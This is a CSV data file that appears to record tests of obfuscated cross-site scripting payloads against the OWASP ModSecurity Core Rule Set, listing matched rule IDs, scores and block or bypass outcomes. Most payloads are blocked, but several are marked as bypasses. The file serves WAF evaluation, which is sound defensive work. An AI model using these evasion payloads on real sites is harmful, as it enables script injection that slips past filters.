index,payload,model,syntax,crs,rule_count,rule_ids,rule_refs,total_score,unique_id
69,"<details open ontoggle='new Function(""return al"" + ""ert"")(1)()'>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,64 || o24,13v221,64t:urlDecodeUni || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,64t:htmlEntityDecode,t:jsDecode || ",20,176482707766.761318
70,"<details open ontoggle='new Function(String.fromCharCode(97,108,101,114,116,40,49,41))()'>",0,1,block,5,"934100,934100,941100,941390,949110","o24,13v221,90 || o34,19v221,90t:removeWhitespace || v221,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,90t:htmlEntityDecode,t:jsDecode || ",20,176482707954.559602
71,<details open ontoggle='new Function(`\u0061lert(1)`)()'></details>,0,1,block,6,"920540,934100,934100,941100,941390,949110","v158,10o38,6v221,67 || o24,13v221,67 || o24,13v221,67t:jsDecode || v221,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,67t:htmlEntityDecode,t:jsDecode || ",25,17648270825.633551
72,"<details open ontoggle=(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41));})()>",0,1,block,6,"933160,934100,934100,941100,941390,949110","o35,53v221,95 || o24,11v221,95 || o22,11v221,95t:removeWhitespace || v221,95t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,5v221,95t:htmlEntityDecode,t:jsDecode || ",25,176482708582.541149
73,<details open ontoggle=(function(){eval(atob('YWxlcnQoMSk='))})()>,0,1,block,6,"933160,934100,934100,941100,941390,949110","o35,25v221,66 || o24,11v221,66 || o22,11v221,66t:removeWhitespace || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,5v221,66t:htmlEntityDecode,t:jsDecode || ",25,176482708836.487879
74,<details open ontoggle=(function(){window['a'+'lert']`1`})()>,0,1,block,6,"934100,934100,934100,941100,941370,949110","o24,11v221,61 || o24,11v221,61t:urlDecodeUni || o22,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o35,18v221,61t:urlDecodeUni,t:compressWhitespace || ",25,176482709078.867043
75,<details open ontoggle=Function('al'+'\u0065rt(1)')()>,0,1,bypass,2,"920540,941100","v158,10o38,6v220,54 || v220,54t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482709326.928800
76,<details open ontoggle=Function('al'+'ert(1)')()>,0,1,bypass,1,941100,"v220,49t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482709681.407030
77,<details open ontoggle=Function(atob('YWxlcnQoMSk='))()>,0,1,bypass,2,"941100,941390","v220,56t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o32,5v220,56t:htmlEntityDecode,t:jsDecode",0,176482709935.833127
78,"<details open ontoggle=setTimeout(function(){eval(String.fromCharCode(97,108,101,114,116,40,49,41))},0)>",0,1,block,6,"933160,934100,934100,941100,941390,949110","o45,53v221,104 || o34,11v221,104 || o32,11v221,104t:removeWhitespace || v221,104t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o23,11v221,104t:htmlEntityDecode,t:jsDecode || ",25,176482710136.378505
79,"<iframe src=""data:text/html,<script>setTimeout(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()},0)</script>"">",0,1,block,10,"934100,934100,934100,941100,941110,941130,941160,941170,941390,949110","o47,11v221,122 || o47,11v221,122t:urlDecodeUni || o46,11v221,122t:removeWhitespace || v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,8v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,15v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o12,16v221,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o36,11v221,122t:htmlEntityDecode,t:jsDecode || ",45,176482710496.075448
80,"<iframe srcdoc=""<script>(function(){Function('al'+String.fromCharCode(101)+'rt(1)')()})()</script>""></iframe>",0,1,block,8,"932130,934100,934100,934100,941100,941110,941160,949110","o22,62v221,109t:cmdLine || o25,11v221,109 || o25,11v221,109t:urlDecodeUni || o24,11v221,109t:removeWhitespace || v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",35,176482710792.119914
81,"<iframe srcdoc=""<script>(new Function('a'+'lert(1)'))()</script>"">",0,1,block,8,"932130,934100,934100,941100,941110,941160,941390,949110","o22,28v221,66t:cmdLine || o25,13v221,66 || o25,13v221,66t:urlDecodeUni || v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,66t:htmlEntityDecode,t:jsDecode || ",35,176482711036.733415
82,"<iframe srcdoc=""<script>new Function('a'+'lert(1)')()</script>"">",0,1,block,9,"934100,934100,941100,941110,941160,941390,942100,942100,949110","o24,13v221,64 || o24,13v221,64t:urlDecodeUni || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,64t:htmlEntityDecode,t:jsDecode || v221,64 || v221,64t:urlDecodeUni || ",40,17648271125.100663
83,"<iframe srcdoc=""<script>new Function('return \\u0061lert(1)')();</script>""></iframe>",0,1,block,9,"920540,934100,934100,941100,941110,941160,941390,942100,949110","v158,10o46,6v221,84 || o24,13v221,84 || o24,13v221,84t:jsDecode || v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,13v221,84t:htmlEntityDecode,t:jsDecode || v221,84 || ",40,176482711578.130284
84,"<iframe srcdoc=""<script>self['ale'+'rt'](1)</script>""></iframe>",0,1,block,5,"941100,941110,941160,941370,949110","v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v221,63t:urlDecodeUni,t:compressWhitespace || ",20,176482711836.816854
85,"<iframe srcdoc=""<script>setTimeout(Function('al'+'ert(1)'),0)</script>"">",0,1,block,5,"941100,941110,941160,941390,949110","v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,72t:htmlEntityDecode,t:jsDecode || ",20,176482712139.363066
86,"<iframe srcdoc=""<script>setTimeout(function(){eval('ale'+'rt(1)')},0)</script>""></iframe>",0,1,block,9,"933160,934100,934100,934100,941100,941110,941160,941390,949110","o46,17v221,89 || o35,11v221,89 || o35,11v221,89t:urlDecodeUni || o34,11v221,89t:removeWhitespace || v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,11v221,89t:htmlEntityDecode,t:jsDecode || ",40,176482712360.517209
87,"<iframe srcdoc=""<script>var a=window; a['ale'+'rt'](1)</script>""></iframe>",0,1,block,4,"941100,941110,941160,949110","v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o16,8v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,176482712629.654990
88,"<iframe srcdoc=""<svg><script>(function(){let f='al'+'ert';window[f](9);})()</script></svg>""></iframe>",0,1,block,9,"932130,934100,934100,934100,941100,941110,941160,941370,949110","o27,43v221,101t:cmdLine || o30,11v221,101 || o30,11v221,101t:urlDecodeUni || o29,11v221,101t:removeWhitespace || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o58,9v221,101t:urlDecodeUni,t:compressWhitespace || ",40,176482712999.418407
89,"<iframe srcdoc=""<svg><script>new Function('return ale'+'rt(1)')()</script></svg>"">",0,1,block,7,"934100,934100,941100,941110,941160,941390,949110","o29,13v221,82 || o29,13v221,82t:urlDecodeUni || v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o21,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,13v221,82t:htmlEntityDecode,t:jsDecode || ",30,176482713167.297983
90,"<object data=""data:text/html,<script>(new Function('\u0061\u006c\u0065\u0072\u0074(5)'))()</script>"">",0,1,block,12,"920540,932130,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","v158,10o52,6v221,101 || o35,47v221,101t:cmdLine || o38,13v221,101 || o38,13v221,101t:jsDecode || v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,13v221,101t:htmlEntityDecode,t:jsDecode || ",55,176482713499.648518
91,"<object data=""data:text/html,<script>(new Function(atob('YWxlcnQoMTIp')))()</script>"">",0,1,block,10,"932130,934100,941100,941110,941130,941160,941170,941300,941390,949110","o35,37v221,86t:cmdLine || o38,13v221,86 || v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,13v221,86t:htmlEntityDecode,t:jsDecode || ",45,176482713761.797042
92,"<object data=""data:text/html,<script>Function('ale'+String.fromCharCode(114,116)+'(1)')()</script>""></object>",0,1,block,10,"934100,934100,934100,941100,941110,941130,941160,941170,941300,949110","o52,19v221,109 || o52,19v221,109t:urlDecodeUni || o50,19v221,109t:removeWhitespace || v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,109t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",45,176482714070.798499
93,"<object data=""data:text/html,<script>new Function('\u0061\u006c\u0065\u0072\u0074(1)')()</script>""></object>",0,1,block,11,"920540,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","v158,10o51,6v221,108 || o37,13v221,108 || o37,13v221,108t:jsDecode || v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,13v221,108t:htmlEntityDecode,t:jsDecode || ",50,176482714399.941698
94,"<object data=""data:text/html,<svg onload=Function('al'+'ert(1)')()></svg>""></object>",0,1,block,6,"941100,941130,941160,941170,941300,949110","v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,176482714517.940392
95,"<object data='data:text/html,<script>Function(""al""+""ert(1)"")()</script>'></object>",0,1,block,7,"941100,941110,941130,941160,941170,941300,949110","v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o29,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",30,176482714811.139143
96,"<object data='data:text/html,<svg xmlns=""http://www.w3.org/2000/svg""><script>eval(atob(""YWxlcnQoMSk=""))</script></svg>'></object>",0,1,block,11,"933160,934100,934100,941100,941110,941130,941160,941170,941300,941390,949110","o77,25v221,129 || o77,5v221,129 || o75,5v221,129t:removeWhitespace || v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o69,8v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,15v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,16v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,129t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o77,5v221,129t:htmlEntityDecode,t:jsDecode || ",50,176482715160.870065
97,"<object type=""text/html"" data=""data:text/html,<svg xmlns='http://www.w3.org/2000/svg' onload='eval(&quot;al&quot;+&quot;ert(1)&quot;)'></svg>""></object>",0,1,block,11,"933160,934100,934100,934100,941100,941130,941160,941170,941300,941390,949110","o94,32v221,152 || o94,5v221,152 || o94,5v221,152t:urlDecodeUni || o90,5v221,152t:removeWhitespace || v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,15v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,8v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o30,16v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,13v221,152t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o94,5v221,152t:htmlEntityDecode,t:jsDecode || ",50,176482715395.922223
98,"<svg onload=""((function(){var a=String.fromCharCode;eval(a(97,108,101,114,116,40,49,41));})())""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o52,35v221,102 || o15,11v221,102 || o14,11v221,102t:removeWhitespace || v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o52,5v221,102t:htmlEntityDecode,t:jsDecode || ",30,176482715688.898168
99,"<svg onload=""((function(){var a=atob;eval(a('YWxlcnQoMSk='));})())""></svg>",0,1,block,7,"933160,934100,934100,941100,941160,941390,949110","o37,22v221,74 || o15,11v221,74 || o14,11v221,74t:removeWhitespace || v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o37,5v221,74t:htmlEntityDecode,t:jsDecode || ",30,176482715969.539311
100,"<svg onload=""((new Function('al'+String.fromCharCode(101)+'r'+'t(1)'))())""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o15,13v221,81 || o15,13v221,81t:urlDecodeUni || o30,19v221,81t:removeWhitespace || v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o15,13v221,81t:htmlEntityDecode,t:jsDecode || ",30,17648271626.564064
101,"<svg onload=""((new Function('return al' + 'ert'))())(1)"">",0,1,block,6,"934100,934100,941100,941160,941390,949110","o15,13v221,57 || o15,13v221,57t:urlDecodeUni || v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,57t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o15,13v221,57t:htmlEntityDecode,t:jsDecode || ",25,176482716479.132299
102,"<svg onload=""(function x(){return Function('ale'+'rt(1)')}())()""></svg>",0,1,bypass,2,"941100,941160","v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,176482716787.183466
103,"<svg onload=""(function(){const f=window['\u0061lert'];f(String.fromCharCode(88,83,83))})()""></svg>",0,1,block,8,"920540,934100,934100,934100,941100,941160,941370,949110","v158,10o41,6v221,98 || o14,11v221,98 || o14,11v221,98t:jsDecode || o13,11v221,98t:removeWhitespace || v221,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,98t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o33,20v221,98t:urlDecodeUni,t:compressWhitespace || ",35,17648271703.045009
104,"<svg onload=""(function(){new Function('return ' + atob('YWxlcnQoMSk='))()})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941390,949110","o14,11v221,79 || o14,11v221,79t:urlDecodeUni || o13,11v221,79t:removeWhitespace || v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,13v221,79t:htmlEntityDecode,t:jsDecode || ",30,176482717346.607478
105,"<svg onload=""(function(){return Function('ale'+'rt(1)')}())()""></svg>",0,1,block,6,"934100,934100,934100,941100,941160,949110","o14,11v221,69 || o14,11v221,69t:urlDecodeUni || o13,11v221,69t:removeWhitespace || v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17648271767.944105
106,"<svg onload=""(function(){var a=String.fromCharCode(97,108,101,114,116);window[a](1);})();""></svg>",0,1,block,6,"934100,934100,941100,941160,941370,949110","o14,11v221,97 || o13,11v221,97t:removeWhitespace || v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o71,9v221,97t:urlDecodeUni,t:compressWhitespace || ",25,176482717848.301194
107,"<svg onload=""(function(){var a=String.fromCharCode;var b=a(97)+a(108)+a(101)+a(114)+a(116);window[b](1);})();""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,117 || o14,11v221,117t:urlDecodeUni || o13,11v221,117t:removeWhitespace || v221,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,117t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o91,9v221,117t:urlDecodeUni,t:compressWhitespace || ",30,176482718150.583753
108,"<svg onload=""(function(){var a=window['al'+'ert'];a(1);})();""></svg>",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,68 || o14,11v221,68t:urlDecodeUni || o13,11v221,68t:removeWhitespace || v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o31,18v221,68t:urlDecodeUni,t:compressWhitespace || ",30,17648271846.286576
109,"<svg onload=""(function(){var g='a'+'l'+'ert';window[g](9);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,64 || o14,11v221,64t:urlDecodeUni || o13,11v221,64t:removeWhitespace || v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v221,64t:urlDecodeUni,t:compressWhitespace || ",30,176482718720.343230
110,"<svg onload=""(function(){var l='a'+'l'+'ert';window[l](16);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,65 || o14,11v221,65t:urlDecodeUni || o13,11v221,65t:removeWhitespace || v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o45,9v221,65t:urlDecodeUni,t:compressWhitespace || ",30,176482718999.714314
111,"<svg onload=""(function(){var x='a'+'lert';window[x](1);})()"">",0,1,block,7,"934100,934100,934100,941100,941160,941370,949110","o14,11v221,61 || o14,11v221,61t:urlDecodeUni || o13,11v221,61t:removeWhitespace || v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o0,4v221,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o42,9v221,61t:urlDecodeUni,t:compressWhitespace || ",30,176482719264.514601
